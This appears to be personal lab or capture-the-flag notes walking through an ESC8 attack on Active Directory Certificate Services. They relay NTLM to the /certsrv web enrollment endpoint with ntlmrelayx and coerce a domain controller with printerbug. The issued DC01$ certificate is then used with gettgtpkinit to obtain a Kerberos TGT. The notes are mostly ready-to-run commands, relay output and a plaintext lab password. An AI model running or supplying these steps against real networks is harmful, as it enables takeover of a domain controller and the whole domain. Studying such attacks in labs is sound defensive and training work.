`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:
![[Pasted image 20250626194802.png]]
Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```shell-session
$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

## `--template` value

`--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

## Coerce DC to connect to Attacker

force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

```shell-session
$ python3 printerbug.py blackwood.local/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:

```shell-session
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] HTTP server returned error code 404, treating as a successful login
[*] Authenticating against http://10.129.234.110 as BLACKWOOD/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[-] Authenticating against http://10.129.234.110 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies

request TGT, get ccache file

```shell-session
$ python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip [TARGET-DC] 'blackwood.local/dc01$' /tmp/dc.ccache

#and import to env
KRB5CCNAME=/tmp/dc.ccache
```

## fix for timing error

if you get skew error match the DC's time

```
─$ sudo ntpdate 10.129.9.56
[sudo] password for demise:
2025-06-26 13:36:04.685418 (-0400) +736.494994 +/- 0.034218 10.129.9.56 s1 no-leap
CLOCK: time stepped by 736.494994
```

![[Pasted image 20250626203701.png]]
